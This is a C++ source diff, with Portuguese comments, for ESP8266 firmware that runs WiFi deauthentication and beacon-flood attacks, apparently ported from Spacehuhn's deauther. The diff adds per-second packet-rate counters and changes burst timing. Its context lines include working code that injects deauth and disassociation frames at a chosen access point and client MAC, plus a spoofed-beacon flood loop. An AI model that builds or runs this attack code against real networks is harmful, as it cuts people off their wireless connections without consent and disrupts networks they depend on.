@@ -28,8 +28,14 @@ static uint8_t targetApMac[6];
 static uint8_t targetClientMac[6];
 static uint8_t targetChannel = 1;
 static uint8_t attackReason = 7;
+/** Analogo a deauth.time: so avanca apos burst com sucesso (v2 deauthDevice). */
 static unsigned long lastAttackPacketAt = 0;
 static unsigned long lastBeaconTickAt = 0;
+
+/** Janela 1 s — Attack::updateCounter: deauthPkts / packetRate. */
+static unsigned long s_statsSecondAnchorMs = 0;
+static uint32_t s_deauthPacketCounter = 0;
+static uint32_t s_tmpPacketRateAccum = 0;
 
 /** Igual a A_config.h padrao do Spacehuhn v2 (DEAUTHS_PER_TARGET 25). */
 static constexpr uint8_t kDeauthsPerSecond = 25;
@@ -71,6 +77,29 @@ void restoreWifiRegAfterInjection()
   wifi_set_country(&c);
 }
 
+/** Attack::updateCounter (a cada 1 s): deauthPkts = packetCounter; packetRate = tmpPacketRate; zera acumuladores. */
+static void rollAttackStatsIfNeeded()
+{
+  if (!attackActive && !beaconActive)
+  {
+    return;
+  }
+  const unsigned long now = millis();
+  if (s_statsSecondAnchorMs == 0)
+  {
+    s_statsSecondAnchorMs = now;
+    return;
+  }
+  while (now - s_statsSecondAnchorMs >= 1000UL)
+  {
+    deautherPacketsSent = s_deauthPacketCounter;
+    deautherTmpPacketRate = s_tmpPacketRateAccum;
+    s_deauthPacketCounter = 0;
+    s_tmpPacketRateAccum = 0;
+    s_statsSecondAnchorMs += 1000UL;
+  }
+}
+
 /** Attack::sendPacket — setWifiChannel + um unico wifi_send_pkt_freedom(..., 0). */
 static bool sendPacketSpacehuhn(uint8_t *packet, uint16_t packetSize, uint8_t ch,
                                 bool force_ch)
@@ -80,7 +109,7 @@ static bool sendPacketSpacehuhn(uint8_t *packet, uint16_t packetSize, uint8_t ch
   const bool sent = (wifi_send_pkt_freedom(packet, packetSize, 0) == 0);
   if (sent)
   {
-    deautherTmpPacketRate++;
+    s_tmpPacketRateAccum++;
   }
   else
   {
@@ -127,7 +156,7 @@ static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason
   if (sendPacketSpacehuhn(deauthpkt, packetSize, ch, true))
   {
     success = true;
-    deautherPacketsSent++;
+    s_deauthPacketCounter++;
   }
 
   uint8_t disassocpkt[packetSize];
@@ -136,7 +165,7 @@ static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason
   if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
   {
     success = true;
-    deautherPacketsSent++;
+    s_deauthPacketCounter++;
   }
 
   if (!macBroadcast(stMac))
@@ -149,14 +178,14 @@ static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason
     if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
     {
       success = true;
-      deautherPacketsSent++;
+      s_deauthPacketCounter++;
     }
 
     disassocpkt[0] = 0xa0;
     if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
     {
       success = true;
-      deautherPacketsSent++;
+      s_deauthPacketCounter++;
     }
   }
 
@@ -232,6 +261,9 @@ void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint
   deautherPacketsSent = 0;
   deautherTmpPacketRate = 0;
   deautherInjectFail = 0;
+  s_deauthPacketCounter = 0;
+  s_tmpPacketRateAccum = 0;
+  s_statsSecondAnchorMs = millis();
 
   memcpy(targetApMac, apMac, 6);
   memcpy(targetClientMac, clientMac, 6);
@@ -239,7 +271,7 @@ void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint
   attackReason = reason;
   attackActive = true;
   deautherRunning = true;
-  lastAttackPacketAt = millis() - kDeauthPeriodMs;
+  lastAttackPacketAt = millis();
 
   prepareRadioForDeauthInjection(channel);
 }
@@ -248,6 +280,10 @@ void stopDeauthAttack()
 {
   attackActive = false;
   deautherRunning = false;
+  if (!beaconActive)
+  {
+    s_statsSecondAnchorMs = 0;
+  }
 
   Serial.print(F("[deauther] deauthFrames="));
   Serial.print(deautherPacketsSent);
@@ -264,16 +300,33 @@ void startBeaconAttack()
   prepareRadioForDeauthInjection(1);
   lastBeaconTickAt = millis() - kDeauthPeriodMs;
   beaconActive = true;
+  if (!attackActive)
+  {
+    s_statsSecondAnchorMs = millis();
+    s_deauthPacketCounter = 0;
+    s_tmpPacketRateAccum = 0;
+    deautherPacketsSent = 0;
+    deautherTmpPacketRate = 0;
+  }
+  else if (s_statsSecondAnchorMs == 0)
+  {
+    s_statsSecondAnchorMs = millis();
+  }
 }
 
 void stopBeaconAttack()
 {
   beaconActive = false;
+  if (!attackActive)
+  {
+    s_statsSecondAnchorMs = 0;
+  }
   restorePortalWiFiAfterDeauth();
 }
 
 void updateBeacon()
 {
+  rollAttackStatsIfNeeded();
   if (beaconActive && (millis() - lastBeaconTickAt >= kDeauthPeriodMs))
   {
     for (int i = 0; i < 10; i++)
@@ -304,7 +357,7 @@ void updateBeacon()
       delay(1);
       if (wifi_send_pkt_freedom(beaconPacket, 109, 0) == 0)
       {
-        deautherTmpPacketRate++;
+        s_tmpPacketRateAccum++;
       }
       beaconPacketsSent++;
     }
@@ -319,10 +372,18 @@ bool isDeauthActive()
 
 void updateDeauth()
 {
-  if (attackActive && (millis() - lastAttackPacketAt >= kDeauthPeriodMs))
+  rollAttackStatsIfNeeded();
+  if (!attackActive)
   {
-    deauthDeviceSpacehuhn(targetApMac, targetClientMac, attackReason, targetChannel);
-    lastAttackPacketAt = millis();
+    return;
+  }
+  const unsigned long now = millis();
+  if (now - lastAttackPacketAt >= kDeauthPeriodMs)
+  {
+    if (deauthDeviceSpacehuhn(targetApMac, targetClientMac, attackReason, targetChannel))
+    {
+      lastAttackPacketAt = now;
+    }
   }
 }
 
